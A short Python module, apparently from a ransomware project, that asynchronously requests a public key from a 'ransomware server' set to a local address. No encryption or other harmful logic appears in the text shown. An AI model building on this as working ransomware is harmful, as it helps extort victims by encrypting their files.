from aiohttp import ClientSession

RANSOMWARE_SERVER_URL='http://127.0.0.1:8000'

async def request_keys():
    public_key = await __get(RANSOMWARE_SERVER_URL)
    return public_key


async def __get(url):
    async with ClientSession() as session:
        return await __request(session.get, url)


async def __request(action, url):
    async with action(url) as response:
        return await response.json()